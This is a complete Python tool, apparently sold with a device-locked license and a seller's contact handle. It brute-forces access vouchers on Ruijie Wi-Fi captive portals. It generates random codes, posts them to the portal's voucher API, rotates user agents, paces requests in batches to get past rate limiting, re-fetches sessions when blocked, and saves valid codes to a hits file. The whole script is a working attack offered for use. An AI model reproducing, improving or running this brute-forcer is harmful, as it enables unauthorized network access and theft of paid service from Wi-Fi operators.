import os
import time
import json
import random
import string
import sqlite3
import re
import html
import uuid
import hashlib
import platform
import socket
import requests
import urllib3
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, timedelta
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "scanner_data.db"
STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"
LICENSE_FILE = "license.json"

# ==================== LICENSE CONFIG ====================
VALID_KEY = "AK7.0-11C-9090"
LICENSE_DAYS = 35
WARNING_HOURS = 24  # Warn 24 hours before expiry
# ========================================================

BASE_SLEEP_MIN = 0.20
BASE_SLEEP_MAX = 0.40
BATCH_SIZE = 10
BATCH_SLEEP = 3
RATE_LIMIT_SLEEP = 15
NETWORK_RETRY_SLEEP = 5
LICENSE_CHECK_INTERVAL = 60  # Check license every 60 seconds during scan

console = Console()
session = requests.Session()


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"


# ==================== DEVICE FINGERPRINT ====================

def get_device_id():
    try:
        parts = []
        try:
            mac = uuid.getnode()
            parts.append(f"MAC:{mac:012x}")
        except Exception:
            parts.append("MAC:unknown")
        try:
            parts.append(f"HOST:{socket.gethostname()}")
        except Exception:
            parts.append("HOST:unknown")
        try:
            parts.append(f"PLAT:{platform.system()}-{platform.machine()}")
        except Exception:
            parts.append("PLAT:unknown")
        try:
            parts.append(f"PROC:{platform.processor()}")
        except Exception:
            parts.append("PROC:unknown")
        try:
            parts.append(f"NODE:{platform.node()}")
        except Exception:
            parts.append("NODE:unknown")
        
        raw = "|".join(parts)
        device_hash = hashlib.sha256(raw.encode()).hexdigest()[:32].upper()
        formatted = "-".join([device_hash[i:i+4] for i in range(0, 16, 4)])
        return formatted
    except Exception:
        return "UNKNOWN-DEVICE"


def get_device_name():
    try:
        hostname = socket.gethostname()
        system = platform.system()
        return f"{hostname} ({system})"
    except Exception:
        return "Unknown Device"


class LicenseExpiredException(Exception):
    """Raised when license expires during scan"""
    pass

# =========================================================


# ==================== LICENSE FUNCTIONS ====================

def load_license():
    try:
        with open(LICENSE_FILE) as f:
            return json.load(f)
    except Exception:
        return None


def save_license(key, activated_date, expiry_date, device_id, device_name):
    try:
        with open(LICENSE_FILE, "w") as f:
            json.dump({
                "key": key,
                "activated": activated_date,
                "expiry": expiry_date,
                "device_id": device_id,
                "device_name": device_name,
                "version": 2
            }, f, indent=2)
        return True
    except Exception:
        return False


def get_time_remaining():
    license_data = load_license()
    if not license_data:
        return 0, None, "N/A"
    
    try:
        expiry = datetime.strptime(license_data["expiry"], "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        remaining = expiry - now
        seconds = int(remaining.total_seconds())
        expiry_str = expiry.strftime("%Y-%m-%d %H:%M:%S")
        return max(0, seconds), remaining, expiry_str
    except Exception:
        return 0, None, "N/A"


def check_license():
    license_data = load_license()
    
    if license_data is None:
        return False, "NO_LICENSE", 0
    
    if license_data.get("key") != VALID_KEY:
        return False, "INVALID_KEY", 0
    
    current_device = get_device_id()
    bound_device = license_data.get("device_id", "")
    
    if bound_device and bound_device != current_device:
        return False, "DEVICE_MISMATCH", 0
    
    try:
        expiry = datetime.strptime(license_data["expiry"], "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        
        if now > expiry:
            days_over = (now - expiry).days
            return False, f"EXPIRED|{days_over}", 0
        
        days_left = (expiry - now).days
        return True, "VALID", days_left
    except Exception:
        return False, "CORRUPTED", 0


def format_remaining(seconds):
    if seconds <= 0:
        return "0s"
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    
    parts = []
    if days > 0:
        parts.append(f"{days}Days")
    if hours > 0:
        parts.append(f"{hours}Hours")
    if minutes > 0:
        parts.append(f"{minutes}Mins")
    if secs > 0 and days == 0:
        parts.append(f"{secs}Secs")
    
    return " ".join(parts) if parts else "0s"


def activate_license():
    clear_screen()
    
    console.print(Panel(
        Align.center(Text("🔐 LICENSE ACTIVATION 🔐", style="bold magenta")),
        border_style="magenta", box=ROUNDED,
    ))
    console.print()
    
    device_id = get_device_id()
    device_name = get_device_name()
    
    info = Text()
    info.append("  📅 License Duration : ", style="cyan")
    info.append(f"{LICENSE_DAYS} Days\n", style="bold yellow")
    info.append("  🖥️  Device ID       : ", style="cyan")
    info.append(f"{device_id}\n", style="bold green")
    info.append("  💻 Device Name     : ", style="cyan")
    info.append(f"{device_name}\n", style="bold white")
    info.append("  🔒 Single Device   : ", style="cyan")
    info.append("This key will be LOCKED to this device only\n", style="bold red")
    console.print(Panel(info, title="Activation Info", border_style="cyan", box=ROUNDED))
    console.print()
    
    try:
        user_key = Prompt.ask("[bold cyan]➜ Enter License Key[/bold cyan]").strip()
    except KeyboardInterrupt:
        return False
    except Exception:
        return False
    
    if user_key != VALID_KEY:
        console.print()
        console.print(Panel(
            Align.center(Text("❌ INVALID LICENSE KEY ❌", style="bold red")),
            border_style="red", box=ROUNDED,
        ))
        time.sleep(2)
        return False
    
    now = datetime.now()
    expiry = now + timedelta(days=LICENSE_DAYS)
    
    if save_license(
        VALID_KEY,
        now.strftime("%Y-%m-%d %H:%M:%S"),
        expiry.strftime("%Y-%m-%d %H:%M:%S"),
        device_id,
        device_name
    ):
        console.print()
        console.print(Panel(
            Align.center(Text("✅ LICENSE ACTIVATED SUCCESSFULLY ✅", style="bold green")),
            border_style="green", box=ROUNDED,
        ))
        console.print()
        
        detail = Text()
        detail.append("  🖥️  Device      : ", style="cyan")
        detail.append(f"{device_id}\n", style="bold green")
        detail.append("  📅 Activated   : ", style="cyan")
        detail.append(f"{now.strftime('%Y-%m-%d %H:%M:%S')}\n", style="bold white")
        detail.append("  ⏰ Expires     : ", style="cyan")
        detail.append(f"{expiry.strftime('%Y-%m-%d %H:%M:%S')}\n", style="bold yellow")
        console.print(Panel(detail, title="License Details", border_style="green", box=ROUNDED))
        console.print()
        
        Prompt.ask("[bold yellow]➜ Press Enter to continue[/bold yellow]", default="")
        return True
    else:
        console.print("[bold red]❌ Failed to save license file![/bold red]")
        time.sleep(2)
        return False


def show_license_status():
    is_valid, status, days_left = check_license()
    
    clear_screen()
    console.print(Panel(
        Align.center(Text("📋 LICENSE STATUS 📋", style="bold cyan")),
        border_style="cyan", box=ROUNDED,
    ))
    console.print()
    
    license_data = load_license()
    status_text = Text()
    
    if is_valid:
        remaining_sec, _, expiry_str = get_time_remaining()
        status_text.append("  ✅ Status      : ", style="cyan")
        status_text.append("ACTIVE\n", style="bold green")
        status_text.append("  📅 Expiry Date : ", style="cyan")
        status_text.append(f"{expiry_str}\n", style="bold yellow")
        status_text.append("  ⏳ Time Left   : ", style="cyan")
        status_text.append(f"{format_remaining(remaining_sec)}\n", style="bold yellow")
        
        if remaining_sec < WARNING_HOURS * 3600:
            status_text.append("\n  ⚠️  WARNING: License expires soon! Scanner will AUTO-STOP!\n", style="bold red")
    else:
        if status.startswith("EXPIRED"):
            days_over = status.split("|")[1] if "|" in status else "?"
            status_text.append("  ⛔ Status      : ", style="cyan")
            status_text.append(f"EXPIRED ({days_over} days ago)\n", style="bold red")
        else:
            status_text.append("  ❌ Status      : ", style="cyan")
            status_text.append(f"{status}\n", style="bold red")
    
    if license_data:
        status_text.append("  🔑 Key         : ", style="cyan")
        status_text.append(f"{license_data.get('key', 'N/A')}\n", style="bold white")
        status_text.append("  🖥️  Device ID   : ", style="cyan")
        status_text.append(f"{license_data.get('device_id', 'N/A')}\n", style="bold green")
        status_text.append("  💻 Device Name : ", style="cyan")
        status_text.append(f"{license_data.get('device_name', 'N/A')}\n", style="bold white")
    
    console.print(Panel(status_text, title="Current License", border_style="green" if is_valid else "red", box=ROUNDED))
    console.print()
    Prompt.ask("[bold yellow]➜ Press Enter to continue[/bold yellow]", default="")


def require_license():
    is_valid, status, days_left = check_license()
    
    if is_valid:
        return True
    
    if status == "DEVICE_MISMATCH":
        clear_screen()
        console.print(Panel(
            Align.center(Text("🚫 DEVICE MISMATCH 🚫", style="bold red")),
            border_style="red", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Text("  This license key is ALREADY LOCKED to another device.\n  Each license key can only be used on ONE device.", style="bold yellow"),
            border_style="red", box=ROUNDED,
        ))
        console.print()
        Prompt.ask("[bold red]➜ Press Enter to exit[/bold red]", default="")
        return False
    
    if status == "NO_LICENSE":
        return activate_license()
    
    if status == "INVALID_KEY":
        return activate_license()
    
    if status.startswith("EXPIRED"):
        clear_screen()
        console.print(Panel(
            Align.center(Text("⛔ LICENSE EXPIRED ⛔", style="bold red")),
            border_style="red", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Align.center(Text(f"Your {LICENSE_DAYS}-day license has expired.\nThe scanner is now LOCKED.", style="bold yellow")),
            border_style="yellow", box=ROUNDED,
        ))
        console.print()
        Prompt.ask("[bold red]➜ Press Enter to exit[/bold red]", default="")
        return False
    
    return activate_license()

# =======================================================


def normalize_hits(hits):
    if not hits:
        return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result


def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]


def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception:
        return None


def is_tried(conn, code):
    if conn is None:
        return False
    try:
        return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception:
        return False


def mark_tried(conn, code):
    if conn is None:
        return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception:
        pass


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return None


def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception:
        pass


def clear_state():
    try:
        os.remove(STATE_FILE)
    except Exception:
        pass


def wait_for_ruijie_wifi():
    while True:
        try:
            r = session.get("http://192.168.1.1", timeout=3, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return "http://192.168.1.1"
        except Exception:
            pass
        
        try:
            r = session.get("http://10.0.0.1", timeout=3, allow_redirects=True, verify=False)
            if r.status_code < 500:
                return "http://10.0.0.1"
        except Exception:
            pass

        probes = [
            "http://connectivitycheck.gstatic.com/generate_204",
            "http://captive.apple.com/hotspot-detect.html"
        ]
        for url in probes:
            try:
                r = session.get(url, timeout=3, allow_redirects=True, verify=False)
                p = urlparse(r.url)
                if "gstatic.com" not in p.netloc and "apple.com" not in p.netloc and p.netloc:
                    return f"{p.scheme}://{p.netloc}"
            except Exception:
                continue

        time.sleep(NETWORK_RETRY_SLEEP)


def get_random_ua():
    user_agents = [
        "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/604.1"
    ]
    return random.choice(user_agents)


def extract_session(value):
    if not value:
        return None
    try:
        value = html.unescape(value)
    except Exception:
        pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v:
                return v[0]
    except Exception:
        pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        None


def fetch_session(portal_base):
    try:
        r = session.get(f"{portal_base}/", timeout=4, allow_redirects=True, verify=False)
        sid = extract_session(r.url) or extract_session(r.text)
        if sid:
            return sid
    except Exception:
        pass
    return "dummy_session"


def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {
        "Content-Type": "application/json", 
        "Origin": portal_base,
        "User-Agent": get_random_ua()
    }
    payload = {
        "accessCode": code, 
        "sessionId": session_id, 
        "apiVersion": 1, 
        "authCode": "ABCD"
    }
    try:
        r = session.post(url, json=payload, headers=headers, timeout=5, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception:
        return "__NETWORK_ERROR__"


def gen_code(mode, length):
    try:
        if mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
        if mode == "eng":
            return ''.join(random.choices(string.ascii_lowercase, k=length))
        if mode == "mix":
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""


def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs, net_mode):
    layout = Layout()
    
    remaining_sec, _, expiry_str = get_time_remaining()
    
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="license_bar", size=3),
        Layout(name="live", size=3),
        Layout(name="console_logs", ratio=2),
        Layout(name="hits", ratio=2),
    )

    # ==================== နာမည်နှင့် ဆက်သွယ်ရန် အချက်အလက် ပြောင်းထားသည် ====================
    title = Text("❤️AK7.0❤️ Owner", style="bold red", justify="center")
    sub = Text("၀ယ်ယူရန်👉 @ppgkkk 🥫", style="bold yellow", justify="center")
    # =========================================================================================
    
    layout["header"].update(Panel(
        Align.center(Text.assemble(title, "\n", sub)),
        border_style="magenta", box=ROUNDED,
    ))

    if remaining_sec <= 0:
        lic_text = Text(f"⛔ LICENSE EXPIRED  |  Expiry: {expiry_str}", style="bold red", justify="center")
        lic_border = "red"
    elif remaining_sec < WARNING_HOURS * 3600:
        lic_text = Text(f"⚠️  WARNING  |  Expiry: {expiry_str}  |  Left: {format_remaining(remaining_sec)}", style="bold red", justify="center")
        lic_border = "red"
    else:
        lic_text = Text(f"📆 Expiry: {expiry_str}  |  ⏳ Left: {format_remaining(remaining_sec)}", style="bold green", justify="center")
        lic_border = "green"
        
    layout["license_bar"].update(Panel(lic_text, border_style=lic_border, box=ROUNDED))

    if status == "Active":
        s_disp = Text("Active", style="bold green", justify="center")
    elif status == "Limit":
        s_disp = Text("Limit", style="bold red", justify="center")
    else:
        s_disp = Text("--", style="bold yellow", justify="center")

    live_grid = Table.grid(padding=0, expand=True)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_column(ratio=2)
    live_grid.add_row(
        Panel(Align.center(Text(current_code if current_code else "----", style="bold green")),
              title="👁 Code", border_style="green", box=ROUNDED),
        Panel(Align.center(Text(elapsed, style="bold cyan")),
              title="⏱ Time", border_style="cyan", box=ROUNDED),
        Panel(Align.center(Text(f"{tested:,}", style="bold yellow")),
              title="💣 Tested", border_style="yellow", box=ROUNDED),
        Panel(Align.center(s_disp),
              title="👽 Status", border_style="magenta", box=ROUNDED),
    )
    layout["live"].update(live_grid)

    log_table = Table(show_header=False, expand=True, box=None, padding=0)
    log_table.add_column("Logs")
    for lg in running_logs[-6:]:
        log_table.add_row(lg)
    if not running_logs:
        log_table.add_row("[dim]Waiting for codes...[/dim]")

    layout["console_logs"].update(Panel(log_table, title=f"💻 Live Logs [{net_mode}]", border_style="green", box=ROUNDED))

    hits_table = Table(show_header=True, header_style="bold magenta", expand=True, box=ROUNDED)
    hits_table.add_column("No.", width=5, justify="center")
    hits_table.add_column("Valid Code")
    hits_table.add_column("Time", width=10, justify="center")

    last_hits = hits[-10:]
    for i, h in enumerate(last_hits, 1):
        if isinstance(h, dict):
            c = h.get("code", "")
            t = h.get("time", "--:--:--")
        else:
            c = h
            t = "--:--:--"
        hits_table.add_row(str(i), f"[bold green]{c}[/bold green]", f"[dim cyan]{t}[/dim cyan]")

    if not last_hits:
        hits_table.add_row("", "[dim]No hits yet...[/dim]", "")

    hits_title = f"👁 Hits ({len(hits)})"
    if len(hits) > 10:
        hits_title += " — showing last 10"

    layout["hits"].update(Panel(hits_table, title=hits_title, border_style="yellow", box=ROUNDED))
    return layout


def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()
    portal_base = None
    session_id = None
    batch_counter = 0
    last_license_check = time.time()

    conn = init_db()

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "--", hits, running_logs, "Waiting for Wi-Fi")
        live_cm = Live(initial, refresh_per_second=6, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status, net_mode):
        if live is None:
            return
        try:
            live.update(make_layout(mode_name, code, tested,
                                    format_time(time.time() - start_time), status, hits, running_logs, net_mode))
        except Exception:
            pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] {msg}")

    def check_license_and_raise():
        remaining_sec, _, _ = get_time_remaining()
        if remaining_sec <= 0:
            raise LicenseExpiredException("License expired - scanner must stop")

    try:
        push_log("Waiting for Ruijie Wi-Fi connection...")
        portal_base = wait_for_ruijie_wifi()
        push_log(f"Connected to Portal: {portal_base}")
        
        session_id = fetch_session(portal_base)
        push_log("Session obtained. Starting scanner...")
        
        check_license_and_raise()

        while True:
            try:
                now = time.time()
                if now - last_license_check >= LICENSE_CHECK_INTERVAL:
                    check_license_and_raise()
                    last_license_check = now
                    remaining_sec, _, _ = get_time_remaining()
                    if remaining_sec < WARNING_HOURS * 3600 and remaining_sec > 0:
                        push_log(f"[bold red]⚠️  License expires in {format_remaining(remaining_sec)}![/bold red]")
                
                net_mode = "Wi-Fi Connected"

                code = gen_code(mode, length)
                if not code:
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                if is_tried(conn, code):
                    continue

                mark_tried(conn, code)
                tested += 1
                batch_counter += 1
                save_state(mode_str, tested, hits)
                
                push_log(f"Testing code: [bold yellow]{code}[/bold yellow]")
                _update(code, "Active", net_mode)

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if res == "__NETWORK_ERROR__" or res == "":
                    push_log("[red]Wi-Fi disconnected! Waiting for reconnect...[/red]")
                    _update(code, "Limit", "Reconnecting")
                    portal_base = wait_for_ruijie_wifi()
                    session_id = fetch_session(portal_base)
                    continue

                if ("request limited" in low or "blocked" in low
                        or "too many" in low or '"limit"' in low or "rate limit" in low):
                    _update(code, "Limit", "Rate Limited")
                    push_log("[red]Rate Limited! Pausing 15s...[/red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = fetch_session(portal_base)
                    continue

                if '"success":true' in low or '"authresult":"1"' in low or '"code":200' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now_str = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now_str})
                        push_log(f"[bold green]👨‍💻 SUCCESS! Valid Voucher Found: {code}[/bold green]")
                        
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{now_str}] CODE: {code}\n")
                        except Exception:
                            pass
                        save_state(mode_str, tested, hits)
                    _update(code, "Active", net_mode)

                if batch_counter >= BATCH_SIZE:
                    push_log(f"[cyan]Tested {BATCH_SIZE} codes. Resting for {BATCH_SLEEP}s...[/cyan]")
                    time.sleep(BATCH_SLEEP)
                    batch_counter = 0

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except LicenseExpiredException:
                raise
            except KeyboardInterrupt:
                raise
            except Exception:
                portal_base = wait_for_ruijie_wifi()
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
                
    except LicenseExpiredException:
        push_log("[bold red]🛑 LICENSE EXPIRED - AUTO STOPPING SCANNER 🛑[/bold red]")
        _update("----", "Limit", "License Expired")
        time.sleep(3)
        
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass
            live_cm = None
            live = None
        
        clear_screen()
        console.print(Panel(
            Align.center(Text("🛑 SCANNER AUTO-STOPPED 🛑", style="bold red")),
            border_style="red", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Align.center(Text(f"Your {LICENSE_DAYS}-day license has expired.\nThe scanner has been STOPPED automatically.", style="bold yellow")),
            border_style="yellow", box=ROUNDED,
        ))
        console.print()
        Prompt.ask("[bold red]➜ Press Enter to exit[/bold red]", default="")
        raise
        
    finally:
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass


def show_banner():
    clear_screen()
    try:
        # ==================== နာမည်နှင့် ဆက်သွယ်ရန် အချက်အလက် ပြောင်းထားသည် ====================
        console.print(Panel(
            Align.center(Text("❤️AK7.0❤️ Owner", style="bold red")),
            border_style="magenta", box=ROUNDED,
        ))
        console.print()
        console.print(Panel(
            Align.center(Text("၀ယ်ယူရန်👉 @ppgkkk 🥫", style="bold yellow")),
            border_style="yellow", box=ROUNDED,
        ))
        # =========================================================================================
        console.print()
    except Exception:
        pass


def ask_mode():
    while True:
        show_banner()
        try:
            is_valid, status, days_left = check_license()
            if is_valid:
                remaining_sec, _, _ = get_time_remaining()
                if remaining_sec < WARNING_HOURS * 3600:
                    lic_info = Text(f"⚠️  License: {format_remaining(remaining_sec)} left - EXPIRING SOON!", style="bold red", justify="center")
                else:
                    lic_info = Text(f"📆 License: {format_remaining(remaining_sec)} left", style="bold green", justify="center")
                console.print(lic_info)
                console.print()
            
            menu = Text()
            menu.append("  [1]  👨‍💻🔢  NUM (Numbers Only)\n", style="bold cyan")
            menu.append("  [2]  👩‍💻🔤  ENG (Alphabets Only)\n", style="bold cyan")
            menu.append("  [3]  🧑‍💻🔀  MIX (Alphanumeric)\n", style="bold cyan")
            menu.append("  [4]  📋  License Status\n", style="bold yellow")
            menu.append("  [0]  🫅🚪  EXIT\n", style="bold red")
            console.print(Panel(menu, title="Mode ရွေးပါ", border_style="cyan", box=ROUNDED))
            choice = Prompt.ask("[bold cyan]➜ ရွေးချယ်ပါ[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if choice == "0":
            return None
        if choice == "4":
            show_license_status()
            continue
        if choice not in ("1", "2", "3"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return {"1": "num", "2": "eng", "3": "mix"}[choice]


def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(
                Align.center(Text(f"💀 Mode: {mode.upper()}", style="bold magenta")),
                border_style="magenta", box=ROUNDED,
            ))
            console.print()
            menu = Text()
            for i in range(6, 10):
                menu.append(f"  [{i}]  {i} Characters\n", style="bold cyan")
            menu.append("  [0]  🚪  BACK\n", style="bold red")
            console.print(Panel(menu, title="အရှည် ရွေးပါ", border_style="cyan", box=ROUNDED))
            console.print()
            length = Prompt.ask("[bold cyan]➜ အရှည်[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if length == "0":
            return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold red]❌ မှားရွေးမိပါတယ်။ Option အမှန်ကို ရွေးပါ။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return int(length)


def run():
    if not require_license():
        return
    
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))

            clear_screen()
            console.print(Panel(
                Align.center(Text("💾  ရှာလက်စ အခြေအနေ တွေ့ပါတယ်", style="bold yellow")),
                border_style="yellow", box=ROUNDED,
            ))
            console.print()

            info = Text()
            info.append("  💀 Mode    : ", style="cyan")
            info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  👽 Tested  : ", style="cyan")
            info.append(f"{tested:,}\n", style="bold white")
            info.append("  👁 Hits    : ", style="cyan")
            info.append(f"{len(hits)}\n", style="bold green")
            console.print(Panel(info, title="လက်ရှိ အခြေအနေ", border_style="green", box=ROUNDED))
            console.print()

            if Confirm.ask("[bold yellow]➜ ဒီအတိုင်း ဆက်ရှာမလား? (y/n)[/bold yellow]", default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits)
                return
            else:
                clear_state()
        except KeyboardInterrupt:
            raise
        except LicenseExpiredException:
            raise
        except Exception:
            clear_state()

    while True:
        mode = ask_mode()
        if mode is None:
            return

        length = ask_length(mode)
        if length is None:
            continue

        scan_loop(mode, length)
        return


def main():
    try:
        run()
    except LicenseExpiredException:
        pass
    except KeyboardInterrupt:
        pass
    except BaseException:
        pass
    finally:
        try:
            clear_screen()
        except BaseException:
            pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append("❤️AK7.0❤️ Owner", style="bold red")
            bye.append("\n\n")
            console.print(Align.center(bye))
            time.sleep(1.5)
        except BaseException:
            try:
                print("\n\n❤️AK7.0❤️ Owner")
            except BaseException:
                pass


if __name__ == "__main__":
    main()